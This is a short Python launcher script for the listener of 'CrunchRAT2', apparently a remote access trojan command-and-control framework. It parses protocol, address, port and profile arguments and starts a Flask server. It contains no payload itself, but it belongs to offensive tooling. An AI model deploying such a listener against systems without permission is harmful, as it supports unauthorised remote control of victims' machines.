import argparse
from core.webserver import WebServer
from core.message import *

# TO DO: add argument checks here

parser = argparse.ArgumentParser(prog="listener.py",
                                 description="CrunchRAT2 Listener - " +
                                 "Written by Hunter Hardman @t3ntman")
parser.add_argument("protocol",
                    action="store",
                    type=str,
                    help="listener protocol [http][https]")
parser.add_argument("external_address",
                    action="store",
                    type=str,
                    help="listener external address")
parser.add_argument("port",
                    action="store",
                    type=int,
                    help="listener port")
parser.add_argument("profile",
                    action="store",
                    type=str,
                    help="listener profile")

# parses command-line arguments
args = parser.parse_args()

# tries to start Flask listener
try:
    WebServer().start_flask_server(args.protocol,
                                   args.external_address,
                                   args.port,
                                   args.profile)

# this exception is raised if "listener.py"
# is not ran with sudo or root privileges
except IOError:
    print_error("[!] Please re-run with sudo or root privileges.")

except Exception as e:
    print_error("[!] Error starting Flask web server:\n" + str(e))
